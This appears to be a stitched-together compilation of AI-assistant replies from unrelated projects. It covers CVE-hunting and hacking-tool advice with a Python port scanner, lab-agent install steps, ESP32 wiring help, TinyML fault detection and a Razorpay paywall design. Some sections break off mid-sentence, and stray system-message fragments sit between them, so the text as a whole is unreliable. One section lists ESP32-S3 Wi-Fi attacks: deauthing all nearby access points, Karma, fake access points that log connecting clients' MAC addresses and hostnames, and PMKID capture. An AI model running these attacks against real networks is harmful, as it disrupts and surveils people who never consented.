title: Finding CVEs ≠ being the best hacker
text: - A **CVE is just an ID** assigned to a bug you found in *someone else's* software. It's a naming system, not a skill certificate. - Most elite pentesters/red teamers have **zero CVEs** — they break into networks using known techniques masterfully chained. - Meanwhile people **farm trivial CVEs** — find an XSS in some abandoned WordPress plugin with 12 users, get an ID, look impressive on LinkedIn. Nobody in the field is fooled by that. - The causality is backwards: deep understanding → you stumble into CVEs. You can't reverse it: chasing CVEs doesn't build understanding. CVEs in *meaningful* software (Chrome, Linux kernel, big enterprise products) are impressive. CVE #47,382 in "Bob's WordPress Theme v0.2" is noise.

title: But — how do people actually find new bugs? The real methods:
text: There's no universal recipe (if there were, software would be bug-free), but there are **4 proven methodologies** — pick based on target: **1. Code review (open-source targets — your best entry point)** ``` Pick a small OSS project (GitHub, a plugin, a library) → map where untrusted input enters (HTTP params, files, sockets) → trace each input to dangerous sinks (exec, SQL, eval, memcpy, deserialization) → find one place a check is missing → that's your bug ``` Tools: Semgrep, CodeQL (queries like "input → dangerous function, no sanitizer in between" — literally finds CVEs), plus your own eyeballs. **2. Fuzzing (native code — how most big CVEs are born)** ``` Take a parser (image lib, PDF reader, protocol impl) → harness it with AFL++/libFuzzer → run for days with ASan build → crashes → triage → some crashes are exploitable bugs → CVE ``` Boring, brute-force, devastatingly effective. Project Zero found thousands this way. **3. Variant analysis (the multiplier)** One disclosed bug → ask "where else does this pattern exist?" → CodeQL the pattern across entire ecosystems. One bug class → 15 CVEs. This is how researchers like Github Security Lab operate. **4. Patch diffing** Old vs new version diff → the fix points at the bug → often reveals the fix is incomplete or has siblings.

title: "Steps to hack anything" — the honest version
text: There is no universal playbook. What exists is a **meta-process** that adapts to every target: ``` Understand the target deeply (how it's built, what it assumes) → Map attack surface (every input, every trust boundary) → Form hypotheses ("what if the dev assumed X?") → Test each hypothesis → Escalate whatever anomaly you find into impact ``` Every domain fills in the details differently — web (PortSwigger methodology), networks (PTES/OSSTMM), binaries (fuzz + review), AD (BloodHound paths). The *method* is constant; the *knowledge* is what you grind for years.

title: Where CVEs actually come from in practice
text: People don't wake up and "find a CVE." They: 1. Use a piece of software heavily → notice something weird 2. Read its code while learning → spot a missing check 3. Fuzz it as practice → get a crash 4. Read another researcher's writeup → hunt the same pattern elsewhere Every one of these is a byproduct of deep work, not a goal.

title: The actual path (tying your whole journey together)
text: Your syllabus already encodes this: **foundations → exploit known vulns on labs → read 100+ writeups → then** new bugs start appearing *to you* — because you'll finally see what everyone else saw and notice the one thing they missed. Want the fastest realistic route to a *first* real CVE? **Pick a small open-source project on GitHub, learn Semgrep/CodeQL, hunt the OWASP Top 10 patterns in it.** People get their first CVEs within months this way — small project, real finding, real credit. Every tool on Kali started as someone scratching an itch. Here's the real picture:

title: Can you? Yes — and the bar is lower than you think
text: A "hacking tool" is just a program that talks to a protocol or automates a test. The famous ones are open source — you can literally read how nmap, sqlmap, or ffuf work and build your own version.

title: Language choice (match the tool type)
text: | Language | Best for | Tools built in it | |---|---|---| | **Python** | Prototypes, web tools, automation — fastest to write | sqlmap, impacket, wfuzz | | **Go** | Fast network tools, single static binaries — modern favorite | ffuf, nuclei, subfinder, amass | | **Rust** | Speed + safety, growing | feroxbuster | | **C** | Low-level: raw packets, exploits, privesc | nmap's core, kernel exploits | | **Bash** | Gluing other tools, quick recon scripts | countless recon pipelines | Start with Python. Move to Go when speed hurts.

title: What each tool category actually is under the hood
text: - **Port scanner** = loop over ports, try `connect()`, report what answers. Advanced: raw SYN packets (scapy/sockets). - **Dir brute-forcer** = HTTP GET wordlist + check status codes. - **Subdomain enum** = DNS queries for wordlist + APIs (crt.sh). - **Packet sniffer** = raw socket / pcap, parse headers. - **Password cracker** = hash wordlist entries, compare. - **Fuzzer** = generate mutated inputs → send → watch for crashes/anomalies. Proof of how simple the core is — a working threaded port scanner in ~25 lines: ```python import socket, sys from concurrent.futures import ThreadPoolExecutor def scan(host, port): try: s = socket.create_connection((host, port), timeout=1) print(f"[+] {port} open") s.close() except OSError: pass host = sys.argv[1] with ThreadPoolExecutor(200) as ex: ex.map(lambda p: scan(host, p), range(1, 1025)) ``` `python scanner.py 192.168.1.10` — that's the entire core of what nmap does at its simplest level. The other 99% of nmap is speed, evasion, and service detection.

title: The real development workflow
text: ``` 1. Itch: "checking X manually sucks" 2. Prototype: ugly script that works 3. Iterate: threading/async → arg parsing → output formats 4. Package: pip installable / go build → binary / git repo + README 5. Share: GitHub → community feedback makes it real ``` Key libraries to learn: `scapy` (packets — the magic library), `requests`/`httpx`, `socket`, `pwntools` (exploit dev), `impacket` (Windows protocols — read this codebase, it's a masterclass), `asyncio`/`concurrent.futures`.

title: The #1 education hack: read existing tools' source
text: Pick one tool you use → read its GitHub repo top to bottom: - **ffuf** (Go) — clean, modern, ~readable in a weekend - **nmap** — the `nmap-services` file + NSE scripts alone teach networking deeply - **sqlmap** — how it detects tests/errors is brilliant - **nuclei** — the entire tool is "YAML templates + HTTP engine" — you could clone it You'll learn more from one honest codebase read than 10 tutorials.

title: Where your own tools actually beat the famous ones
text: Honest truth: your port scanner won't beat nmap. **But** — custom tools win in: - **Your specific workflow** — script that does *your* recon chain exactly how you like it - **Niche gaps** — tool for one specific app/API/bug nobody else bothered with - **Speed of adaptation** — new technique drops, you implement it in an hour instead of waiting for a tool update - Bug bounty hunters with custom recon automation find stuff before everyone running the same public tools

title: Project ladder (build these in order, each teaches a layer)
text: 1. Port scanner (sockets, threading) 2. Directory buster (HTTP, wordlists, async) 3. Subdomain enumerator (DNS, external APIs) 4. Banner grabber / service fingerprinter 5. Packet sniffer (scapy — this is where it clicks) 6. A fuzzer for some file format or protocol 7. Your own recon pipeline gluing 1–5 together → **this becomes your signature tool** That ladder maps onto Phase 1–3 of your syllabus — each project forces you to learn the protocol you're attacking, which is the whole point. title: 1. Network / firewall
text: The Mac's current IP is `192.0.0.2` (from `ifconfig`). For a UTM Linux VM, the gateway is usually `192.168.64.1` or `192.168.128.1`. I started the server with all of those in the certificate: ```bash cd /Users/abhayjadhav/GANPATI-BAPPA-MORYA/labdesk/server LABDESK_DEV_HTTP_ADDR=:8080 \ LABDESK_SERVER_NAME=192.0.0.2,192.168.64.1,192.168.128.1,localhost,127.0.0.1 \ go run ./cmd/server ``` **Firewall:** when the other device first connects, macOS may show a dialog asking if `labdesk-admin` can accept incoming network connections. Click **Allow**.

title: 2. Get an enrollment token
text: Open the console at `http://localhost:5173`, or generate from the command line: ```bash TOKEN="<your-jwt>" curl -X POST -H "Authorization: Bearer $TOKEN" \ -H "Content-Type: application/json" \ -d '{"note":"multi-device test","ttl_hours":24,"max_uses":10}' \ http://localhost:8080/api/enrollment-tokens ```

title: 3. Install the agent on the other device
text: ### Option A — Linux (UTM VM / Ubuntu / Kali) 1. Copy the Linux ARM64 binary from this Mac to the VM: ```bash scp dist/release/linux-arm64/labdesk-agent user@vm:/tmp/ ``` Or copy `dist/release/linux-arm64/labdesk-agent_0.1.0_linux_arm64.deb` and install: ```bash sudo dpkg -i labdesk-agent_0.1.0_linux_arm64.deb ``` 2. If using the raw binary: ```bash chmod +x labdesk-agent sudo LABDESK_ENROLL_TOKEN="<token>" ./labdesk-agent enroll -server https://<admin-ip>:8443 sudo ./labdesk-agent run ``` For the `.deb`, after install: ```bash export LABDESK_ENROLL_TOKEN="<token>" sudo -E /opt/labdesk-agent/bin/labdesk-agent enroll -server https://<admin-ip>:8443 sudo systemctl enable --now labdesk-agent ``` Replace `<admin-ip>` with whichever IP the VM can reach: - if on the same LAN as the Mac → `192.0.0.2` - if a UTM shared-network VM → use the VM's default gateway (`ip route | grep default`) ### Option B — Windows Run the installer on the lab machine: ```powershell labdesk-agent-0.1.0-windows-amd64.exe ``` The installer asks for: - **Token** — paste the enrollment token from above - **Server URL** — `https://192.0.0.2:8443` or the actual admin IP It will enroll, install, and start the Windows service.

title: 4. Verify in the console
text: The new machine should appear in the dashboard within ~15 seconds with `connected: true`.

title: 5. Feature test checklist
text: Test these in order on the new device. Start with a disposable VM or a test Windows account. | Feature | How to test | |---|---| | **Heartbeat / online** | Machine card shows `online` and metrics (CPU, memory, disk) update. | | **Inventory** | Go to the machine detail → Processes / Apps tabs, or dispatch `list_processes` / `list_apps` from the dashboard. | | **Power: Lock** | Select the machine → **Lock**. Screen should lock. | | **Power: Restart** | Select the machine → **Restart** (VM or test PC). It should reboot. | | **Power: Shutdown** | Select the machine → **Shutdown**. | | **Wake-on-LAN** | Shut down the machine, then from the console send **Wake** using its MAC. It must be on the same broadcast network. | | **Block application** | Create a block → add a process name like `firefox` → assign the machine → start. Then try opening Firefox; it should be killed and logged. | | **Reset** | Create a reset policy, add a golden profile path, run **Preview** first, then **Reset**. Use a test account/VM only. | | **Exam** | Exams → create → add the machine → **Start**. Open a forbidden app or switch windows; violations should stream live. |

title: 6. Quick packaged admin test (optional)
text: If you want to test the packaged **Admin app** itself on this Mac, stop the dev server, then run the packaged binary: ```bash cd dist/release/darwin-arm64 sudo ./labdesk-admin run ``` Then open `https://localhost:8443` or `https://192.0.0.2:8443` from the other device. It uses its own `data/` dir, so any agents you already enrolled will need to re-enroll.

title: Notes
text: - `LABDESK_SERVER_NAME` must contain the exact IP/hostname the agent uses, otherwise the agent rejects the certificate after enrollment. - For real LAN testing, replace `192.0.0.2` with the Mac's actual Wi-Fi/Ethernet IP. - The current dev server has `LABDESK_DEV_HTTP_ADDR=:8080`, which is only for the Vite dev proxy. Agents and other devices should **not** use port `8080`; they use `8443`/`8444`. - Windows test PCs may need to install PostgreSQL first if you run the packaged Admin app there. The Linux `.deb` for Admin declares `Depends: postgresql` and tries to create the DB. === MESSAGE 226 - System === <additional_metadata> NOTE: Open files and cursor position may not be related to the user's current request. text: I read the code rather than assuming, and found **22 concrete defects**. The ones that matter most: **Genuinely broken, user-visible:** - `/api/agent/download` **does not exist**, but the Enrollment page tells users to `curl` it — the documented install path is broken - Policy delete button calls an empty function — silently does nothing - **No password-change endpoint exists at all** — the default `admin123!` can never be rotated, even though `example.env` says "change after first login" - Unknown URLs render a blank page **Reliability, hits your #1 feature:** - Offline machines fail instantly with no queue. **"One-click reset lab" partially fails whenever any machine is briefly offline** — exactly the pre-exam scenario you built this for - After a server restart, machines show **online when they're powered off** - Commands stuck in `sent` **forever** after a restart (the timeout is an in-memory `time.Sleep`) **Security:** - Deleting or disabling a user **does not invalidate their token** — valid up to 12 hours - `/api/enroll` is not rate-limited → enrollment-token brute force from the LAN - The rate limiter breaks behind a reverse proxy (all clients share one bucket)

title: Wiring rules
text: - **3.3V only** — do not power the SD module from 5V, and don't use a 5V-only module. The S3's GPIOs are not 5V tolerant. - **Short wires** — keep jumpers under ~10 cm. The firmware starts at 1 MHz (`SD.begin(SD_CS, SPI, 1000000)`) so it tolerates mediocre wiring, but shorter is always better. - **Good ground** — a solid shared GND matters more than people expect on breadboard SPI.

text: | Range | Reason | |---|---| | GPIO 19/20 | Native USB — serial monitor **and** BadUSB keyboard | | GPIO 26–37 | Internal flash/PSRAM (octal on N16R8) — touching these crashes the chip | | GPIO 0, 3, 45, 46 | Strapping pins — can break boot | | GPIO 48 | Onboard RGB LED (BadUSB/WIDS status) | | GPIO 14 | Buzzer output |

title: SD troubleshooting — most likely causes in order:
text: **1. Your module probably needs 5V, not 3.3V** ← check this first The common blue/red MicroSD SPI modules have an **onboard AMS1117 regulator + 74LVC125 level shifter** — they're designed for **5V VCC**. Feeding 3.3V underpowers the card → init fails. It's safe: the module outputs 3.3V logic to the ESP32 either way. → If your module has a regulator chip or a pin labeled just "VCC/5V": **move VCC to the 5V/VIN pin** on the DevKit. → If it's a bare breakout (no chips, just pin headers straight to the card slot): it genuinely needs **3.3V**. **2. Card format** — must be **FAT32**. SDXC cards >32GB ship as exFAT and won't mount. Reformat to FAT32 (or use a ≤32GB card). **3. Wiring** — verify continuity on all four lines, no swapped MISO/MOSI: | SD module | ESP32-S3 | |---|---| | CS | GPIO 10 | | SCK | GPIO 12 | | MOSI | GPIO 11 | | MISO | GPIO 13 | **4. Insert the card fully** — click-in until it latches; a half-seated card fails exactly like this. Try the 5V fix first — it's the classic cause — then hit the RESET button and tell me what the serial log says. The firmware retries SD every 10 s anyway, so you can even wire it while it's running and watch `diag` in the web UI. === MESSAGE 106 - System === <additional_metadata> NOTE: Open files and cursor position may not be related to the user's current request. title: If `tone 2000 500` is also silent — it's wiring, not firmware
text: From your photo, the black cylinder at the top looks like the buzzer. Check: 1. **Signal pin must be GPIO 14** — on the DevKitC, GPIO14 is on the **right-side header** (USB port facing you, counting down). If your buzzer is soldered to a different pin, either move it or change **Settings → Buzzer GPIO** in the web UI to whatever pin it's on. 2. **Polarity** — if it has a `+` marking, that leg goes to GPIO14, other leg to GND. Passive piezo doesn't care, but active buzzers do. 3. **Buzzer type** — if it's an **active** buzzer module with 3 pins (VCC/I-O/GND), it needs `VCC→3.3V` too, and it'll sound continuously on any tone command. A bare 2-pin passive buzzer/piezo just needs `+→GPIO14`, `−→GND`. Also worth noting from the photo: your **SD module is the 5V type** (blue board with AMS1117 regulator + level shifter chip visible). Its VCC should be on the **5V pin**, not 3.3V — if it IS on 5V already, good; the boot log earlier showed "SD init failed" but the firmware retries every 10 s, so check the tray's `SD: OK/ERR` in the web UI to see its live state. title: Overview
text: The user, an embedded systems and full-stack web developer, requested assistance in building a complete Web OS desktop interface hosted on an ESP32 (WROOM-1) using ESPAsyncWebServer and WebSockets. The goal is to create a Windows-style dark theme interface with a bottom taskbar, start menu, and built-in applications like System Status, Terminal, File Manager, and Wi-Fi Scanner. title: Attacks that can be fully implemented on the ESP32-S3 Super Mini
text: Because the S3 has **one Wi-Fi radio**, no SD card, and limited RAM/flash, some attacks are physically impossible. Here is the realistic list. ### 1. Already working (serial CLI) - `scanall`, `sniffbeacon`, `sniffprobe`, `sniffdeauth` - `attack -t deauth` (targeted, broadcast, all) - `attack -t rickroll` - `attack -t beacon -r` - `attack -t ssidspam` - `attack -t fakeap` - `attack -t probeflood` - `sniffpmkid` ### 2. Can be added now | Attack | How it would work on the S3 | |---|---| | **Multi-SSID fake AP / SSID cycler** | One real AP that rotates its advertised SSID every few seconds from a saved list. The radio can only be one AP, but it can change the SSID. | | **Karma attack** | Sniff probe requests and immediately send a matching beacon for the requested SSID. | | **Client logging on fake AP** | When a device connects to the fake AP, log its MAC, IP, and hostname. `WiFi.softAPgetStationNum()` / `tcpip_adapter` gives this. | | **Channel-hopping deauth all** | `deauthall` that hops channels 1–13 automatically instead of staying on one. | | **PMKID + deauth combo** | `sniffpmkid -d` already exists; can make it auto-run on every scanned AP. | | **SSID list beacon spam** | Load a list of custom SSIDs and spam all of them as beacons. | | **Custom fake AP options** | Open/WPA2, custom BSSID, hidden/visible, custom channel. | | **Handshake / EAPOL pcap to SPIFFS** | Save captured EAPOL/PMKID frames to the small SPIFFS partition. | ### 3. Not feasible on the S3 | Attack | Why not | |---|---| | **Multiple real APs at once** | One radio = one AP. You can only fake many SSIDs with beacon spam. | | **5 GHz attacks** | S3 is 2.4 GHz only. | | **WPA/WPA2 cracking** | Not enough compute/flash. Capture only. | | **Concurrent AP + promiscuous scan** | Single radio must switch modes

title: Webapp controls — one-line explanation
text: ### Connection - **Connect S3** — open the Web Serial port and link to the S3. - **Disconnect** — close the serial port. - **Status** — ask the S3 for current mode, packets sent, channel, and free heap. ### Targets - **Scan APs** — run `scanall` to discover nearby access points. - **List APs** — show the scanned AP list (index / channel / SSID / RSSI). - **Clients** — show the MAC and RSSI of devices currently connected to the fake AP. - **Stop Scan** — send `stopscan` to abort any running scan or attack. ### Attacks - **Deauth Target** — deauthenticate the selected access point. - **Deauth All** — deauth all scanned APs and also broadcast deauth on rotating channels. - **Rick Roll** — spam beacons using the rick-roll song SSID names. - **Random Beacons** — spam beacons with randomly generated SSIDs. - **Probe Spam** — send probe requests to the selected AP. - **Probe Flood** — flood probe requests to every scanned AP. - **Karma** — listen for probe requests and reply with matching beacons. - **SSID Spam** — repeatedly broadcast one custom SSID as a beacon. ### Fake AP - **SSID** — the fake AP name, or a comma-separated list for cycling. - **Channel** — the 2.4 GHz Wi-Fi channel to use (1–13). - **Password** — optional WPA2 key (8–63 chars); empty means open AP. - **BSSID** — optional custom AP MAC address (`02:xx:xx:xx:xx:xx`). - **Hidden** — do not broadcast the SSID in public scans. - **Cycle list** — rotate through the comma-separated SSIDs every 5 s. - **Use saved SSID list** — use the `ssids` list already stored on the S3. - **Start Fake AP** — start the AP with the chosen settings. - **Stop** — stop the fake AP and release the radio. ### Deauth All - **Channel** — optional fixed channel; if left blank the attack targets all known APs and hops channels. ### Termin

title: Main integration challenge
text: Real TinyML inference is not simply a matter of including `model.h`. The ESP32 must reproduce the same 36 audio features that Python/librosa generated during training and apply exactly the same scaler values. The project’s integration notes recommend either: 1. Implementing matching MFCC and spectral feature extraction in C/C++, or 2. Using Edge Impulse to generate both feature extraction and inference code. There is also a library mismatch to resolve: - The converter currently exports an **INT8 model**. - The integration notes say EloquentTinyML may only support float models in the proposed setup. - Therefore, the project may need the official TensorFlow Lite Micro API, a compatible wrapper, or a float model. See <ref_file file="/Users/abhayjadhav/Clients/TinyML-FaultDetection/fault_detection_dashboard/PHASE5_INTEGRATION.md" />.

title: Important gaps and risks
text: 1. **No real ML inference yet.** 2. **No collected dataset or generated models.** 3. **Temperature and vibration are not included in training**, despite the project being described as multi-sensor fault detection. 4. **No automated tests** for Python feature extraction, training, API behavior, or WAV generation. 5. **Class order must come from `labels.txt`.** The hard-coded order in the integration guide does not match `LabelEncoder`’s alphabetical order and could produce incorrect displayed predictions. 6. **INT8 inference details are incomplete.** Input/output quantization scales and zero points must be handled. 7. **Model-training dependencies are loosely pinned**, which can cause version compatibility problems. 8. **Machine selection currently does not change classification thresholds.** 9. **The web server performs blocking sensor reads**, so requests can pause during temperature conversion, vibration sampling, sound sampling, and recording. 10. **README OLED model inconsistency:** SSD1306 versus SH1106. 11. **No authentication or validation for dashboard APIs.** This is acceptable for an isolated prototype network but not production deployment.

title: Recommended next step
text: Before implementing TinyML inference, I recommend this sequence: 1. Verify every sensor using the diagnostic sketches. 2. Confirm the exact OLED model and update documentation. 3. Test recording and downloading valid WAV files. 4. Collect a balanced real-world dataset. 5. Decide whether the final model is: - Audio-only, or - Audio + temperature + vibration. 6. Add validation tests for feature dimensions, labels, and quantization. 7. Train one machine model first—preferably the DC motor. 8. Integrate one model and verify ESP32 features against Python output. 9. Add the other machine models only after the first model works reliably. Overall, this is a functional embedded dashboard and data-collection prototype, but it should currently be described as **“TinyML-ready fault detection”**, not completed TinyML fault detection, because its actual classifications are still threshold-based. === MESSAGE 40 - System === <additional_metadata> NOTE: Open files and cursor position may not be related to the user's current request. title: Option 1: Vercel dashboard + direct device connection
text: ```text ESP32 ── USB Serial ── Browser │ ▼ Vercel dashboard ``` The Vercel website uses the browser’s **Web Serial API** to communicate directly with the ESP32. ### Supports - Live sensor values - Machine selection - Sensor diagnostics - Recording commands - Local health checks - Model predictions from the ESP32 - Downloading WAV and CSV files - Configuring Wi-Fi - Updating device settings ### Advantages - No database - No backend account - No cloud telemetry cost - Works offline after the dashboard loads - Sensor data remains local ### Limitations - ESP32 must be connected by USB. - Mainly works in Chrome/Edge on desktop. - Web Serial is generally unavailable on iPhone/iPad. - No remote monitoring. - No centralized history. - No automatic dataset synchronization. - No multi-user or fleet management. This is the simplest Vercel-only architecture. ---

title: Option 2: Vercel dashboard + direct local Wi-Fi
text: ```text ESP32 hotspot/local network │ ▼ Browser running Vercel dashboard ``` The Vercel dashboard attempts to fetch data directly from the ESP32’s local IP address. For example: ```javascript fetch("http://192.168.4.1/api/sensors") ``` ### Major browser problems Because Vercel is HTTPS and the ESP32 normally serves HTTP: - Browsers can block requests as mixed content. - CORS must be configured on the ESP32. - Private Network Access restrictions may apply. - The hosted site may not reliably access `192.168.4.1`. - Browser compatibility varies. - The phone loses internet while connected to the ESP32 hotspot. Therefore, a hosted Vercel page talking directly to an HTTP ESP32 is **not recommended as the primary production architecture**. A better local approach is to continue serving the local dashboard directly from the ESP32. ---

title: Option 3: Use Vercel as both dashboard and API
text: ```text ESP32 ── HTTPS ── Vercel API routes │ Browser ── HTTPS ────────┘ ``` This is possible. The ESP32 posts telemetry to Vercel API endpoints: ```http POST https://your-project.vercel.app/api/telemetry ``` The dashboard retrieves it through: ```http GET https://your-project.vercel.app/api/devices/{id}/telemetry ``` But Vercel API functions are stateless. Data stored in function memory or local files is not persistent or reliable. You would still need an external storage service, such as: - Vercel Postgres/Neon - Vercel Blob - Upstash Redis - Turso - MongoDB Atlas - Firebase - AWS S3 - Cloudflare R2 This removes Supabase, but it does not remove the need for storage. --- # Recommended non-Supabase architecture If you want the complete cloud product without Supabase, I recommend: ```text ESP32 │ │ HTTPS telemetry ▼ Vercel API routes ├── Authentication ├── Device registration ├── Telemetry validation ├── Dataset metadata └── Model assignments │ ├── Neon Postgres ├── Vercel Blob └── Upstash Redis │ ▼ Next.js dashboard hosted on Vercel ```

title: How it detects faults right now
text: Currently, the ESP32 is **not using a trained ML model**. It continuously applies simple thresholds: ```text Temperature > 45 °C → Overheating Vibration > 4.0 m/s² → Unbalance Vibration > 2.0 m/s² → Misalignment Sound > 85 calculated dB → Bearing Fault Otherwise → Healthy ``` This is only demonstration logic. It will not reliably understand your specific DC motor, direction changes, stopped rotation, or movement. --- # Better approach for your DC motor Because you have one motor and one portable sensor, the most reliable first version is: 1. Attach the device firmly to the motor. 2. Select **DC Motor**. 3. Start the motor in its correct normal direction. 4. Press **Calibrate Healthy Baseline**. 5. Record normal vibration and sound for approximately 30–60 seconds. 6. ESP32 saves the normal operating signature. 7. During continuous monitoring, compare current behavior against that signature. title: 1. Motor running or stopped
text: A running motor produces both vibration and sound energy. ```text Vibration below baseline floor AND sound below baseline floor for several seconds → Motor Stopped ``` We should not classify a stopped motor as mechanically broken unless the system knows it is **expected to be running**. The dashboard therefore needs a monitoring mode: - **Expected running** - **Expected stopped** - **Maintenance/off** When `Expected running` is selected, an unexpected stop becomes a fault.

title: 2. Excessive vibration
text: During calibration, save normal vibration statistics: - Mean vibration - Standard deviation - Peak vibration - X/Y/Z behavior - Vibration magnitude - Frequency-band energy Example logic: ```text Current vibration > baseline mean + safety margin for 3–5 consecutive windows → Excessive Vibration ``` Using consecutive windows prevents one bump from causing a false alarm.

title: 3. Direction change
text: The ADXL345 cannot directly measure shaft rotation direction. It measures linear acceleration, not clockwise versus anticlockwise rotation. However, if reversing the motor causes different vibration and sound, the system can detect that the motor is behaving differently from its healthy baseline: ```text Normal direction signature versus Reverse direction signature → anomaly detected ``` The safe output should initially be: > Abnormal operation — vibration/audio differs from baseline It should not claim “Direction Reversed” unless we add a Hall sensor, encoder, or tachometer that actually measures rotation direction. title: 4. Device or motor moved

During calibration, save the average orientation vector: ```text baselineX, baselineY, baselineZ ``` If that vector changes substantially and remains changed: ```text Current orientation differs from baseline → Device Moved / Recalibration Required ``` This can detect: - Sensor removed and reattached differently - Motor mounting position changed - Device slipped on the motor - Motor assembly tilted or relocated with a changed orientation It cannot reliably detect relocation if the motor is moved while maintaining exactly the same orientation. text: When viewing the flat face with the pins pointing downward: ```text Flat face ┌─────────────┐ │ DS18B20 │ └─────────────┘ | | | 1 2 3 │ │ │ GND DATA VDD ``` Therefore: - Left pin → GND - Middle pin → GPIO4 - Right pin → 3.3V - 4.7 kΩ resistor between middle and right pins Verify the datasheet if your sensor has a different package.

title: Waterproof probe wiring
text: Common color convention: - Red → 3.3V - Black → GND - Yellow or white → GPIO4 Color conventions are not guaranteed, so check the seller’s datasheet before applying power.

title: Important
text: - Use **3.3V**, not 5V, for safest ESP32 logic compatibility. - The resistor is required for reliable OneWire communication. - Keep DATA wiring short where possible. - Connect sensor ground to the same ESP32 ground. - Avoid routing the DATA wire next to motor power wires. - For longer wiring, use twisted DATA/GND wires and consider a 3.3–4.7 kΩ pull-up. - Do not attach the sensor directly to electrically live motor terminals.

title: 1. Progress tracking today vs. with accounts
text: **Right now:** progress lives in `localStorage` via Zustand persist (`netpulse-roadmap-progress`). It works, but: - Tied to one browser — lost on cache clear / device change - **Trivially editable** — anyone can open DevTools and mark everything complete - No way to know who completed what **With user accounts:** progress syncs to a database keyed by user ID — survives devices, enables leaderboards, and is required for paid gating (you need to know *who* paid).

title: 2. Can Razorpay work without accounts?
text: Partially — but here's the critical truth: > **A purely client-side app cannot securely gate paid content.** Everything shipped to the browser (JS bundles, module JSON, quizzes) can be extracted by anyone with DevTools. Any `if (paid)` check in frontend code is cosmetic and bypassable in seconds. Options by security level: | Approach | Backend needed | Security | |---|---|---| | **A. Razorpay Payment Link + unlock code** | None | Cosmetic — anyone can bypass | | **B. Auth + DB + Razorpay webhooks** | Serverless functions | Strong — content gated server-side | | **C. Full custom backend** | Node/server | Strongest, most work |

title: 3. Recommended architecture (Option B)
text: ``` ┌─────────────┐ ┌──────────────────┐ ┌─────────────┐ │ React app │─────▶│ Supabase │◀─────│ Razorpay │ │ (NetPulse) │ │ Auth + Postgres │ │ Checkout │ └─────────────┘ └──────────────────┘ └──────┬──────┘ │ ▲ │ │ lazy-load premium │ webhook: mark paid │ │ modules only after │ (signature verified │ │ server says "paid" │ server-side) │ └──────────────────────┴───────────────────────┘ ``` - **Supabase** (free tier): email/OAuth login + Postgres + Row Level Security. Progress stored server-side per user. - **Razorpay Subscriptions or Orders**: checkout UI, UPI/cards/netbanking. - **One serverless function** (Supabase Edge Function / Vercel function): receives Razorpay webhook → verifies signature with `KEY_SECRET` → writes `entitlements` row. - **Premium content**: module data/quizzes for paid stages served from an API that checks entitlement — so the content never reaches an unpaid browser. Code-split premium modules with `React.lazy` so they're separate chunks too. - **Secret safety**: `RAZORPAY_KEY_ID` is public-safe (frontend OK). `KEY_SECRET` must *only* live in the webhook function env — never in this repo's frontend.

title: How it works now
text: **Two modes, chosen by env vars:** - **Local mode** (no Supabase vars): app works exactly as today — no login, progress in localStorage. Good for demos. - **Cloud mode** (`VITE_SUPABASE_URL` + `VITE_SUPABASE_ANON_KEY` set): - App boots to a **sign-in / sign-up screen** (`AuthGate`) - New accounts auto-get a **7-day free trial** (configurable in `schema.sql`) - Progress + badges **sync to Supabase** — survives devices, merged on login - Trial ends → **Paywall** with "Subscribe with Razorpay" → opens your payment link - Razorpay fires a **webhook** → edge function verifies the signature → marks the user `active` → user clicks "I've paid — refresh access"

title: Security (the important part)
text: - **Signature verification** in the webhook means nobody can forge "paid" status — only real Razorpay events update entitlements - **RLS policies** mean users can only read/write their own rows; entitlements are read-only to users (only the service-role webhook writes) - `RAZORPAY_KEY_SECRET` and the webhook secret **never touch the frontend** — they live only in the edge function's env - Honest limit: module content is still bundled in the JS, so a skilled user could extract it. For stronger protection, the setup doc describes serving premium content from a Supabase table behind the entitlement check — a good Phase 2 hardening step.

title: What I learned (the key finding)
text: Chromium **cannot region-clip `backdrop-filter`** — I proved it empirically: the filtered backdrop escapes its own clip-path, its own mask, ancestor masks, ancestor clip-paths, and even `overflow:hidden`. The single-blur-layer idea is architecturally impossible, so I stopped chasing it and pivoted.

title: The new architecture
text: - **Text ranges / OCR / container elements** → per-overlay frosted chips (`backdrop-filter`) — same proven approach, now with all the speed fixes underneath. - **Leaf elements (inputs, textareas, selects, images)** → `filter: blur(6px)` applied **directly to the element itself**. Zero overlay filter cost — the cheapest blur Chrome offers. The chip on top keeps only border + badge (`sps-leaf-mask`, no backdrop-filter). title: What "real fault detection" requires
text: Your current device is an **anomaly detector**: it learns "normal" and flags deviation. To detect *named real faults* (bearing wear, unbalance, misalignment, looseness), you need one of two things: ### Option A — Keep anomaly detection, add fault characterization (recommended for your hardware) Instead of naming the fault, characterize *how* behavior changed. This is defensible with an ADXL345 + INMP441: | Change observed | Likely mechanical meaning | |---|---| | High vibration, dominant low-frequency band | Unbalance / looseness | | High-frequency vibration + high-freq audio energy | Bearing wear / friction | | Vibration increase with sound unchanged | Mechanical source, not electrical | | Sound change with vibration unchanged | Acoustic/airflow issue, belt, debris | | Periodic impulse peaks (high kurtosis, crest factor) | Impacting — looseness, gear/bearing defect | | Mount/orientation drift over days | Mount loosening | To get this data you need the features we already scoped: **FFT band energies, crest factor, kurtosis, zero-crossing rate**. Those are the minimum to distinguish *types* of fault signature. ### Option B — True fault classification (needs labeled data, not new hardware) To name faults you'd need a trained classifier — record data while the motor has a *known* induced fault, label it, train a small model (your `model_training/` pipeline already exists for this). This is how the TinyML papers get 95%+: they don't generalize, they train on the specific machine or a standard dataset (MIMII, CWRU bearing dataset). Realistic path: **do Option A now, collect data during stress tests, then train Option B later** — your own stress-test data becomes the training set.

title: How to stress-test safely (induce real faults on a test motor)
text: Use a sacrificial DC motor / fan, not equipment you care about: | Fault to simulate | Safe method | Expected signature | |---|---|---| | Unbalance | Stick a small lump of Blu-Tack/tape weight on one fan blade or rotor | Strong low-freq vibration increase, periodic | | Looseness | Loosen one motor mounting screw slightly | Broadband vibration + impulsive peaks (kurtosis up) | | Bearing friction | Press a pencil eraser lightly against the shaft housing / add a drop of thick oil then run dry later | High-frequency audio + high-freq vibration energy | | Misalignment | Shim one side of the motor mount with cardboard | Axial vibration increase, moderate low-freq rise | | Blade/obstruction | Partially block fan airflow with cardboard | Audio change dominant, vibration mild | | Load stress | Vary supply voltage (bench supply) or load the shaft with a finger on a pulley | Both signals shift; useful for mode learning | | Stopped | Cut power | Both collapse — you already detect this | **Test protocol per fault:** 1. Learn normal baseline (existing Learn button). 2. Run 2 min → record baseline values from `/api` (vibration ratio, band energies, audio diff). 3. Induce fault → run 2 min → record same values + detection delay. 4. Remove fault → record recovery time. 5. Repeat 10× per fault type → that's your accuracy dataset: `detections/(trials)`, false-alarm count during normal runs. Do this before any accuracy claim. The papers I cited report ~73–97% — measured 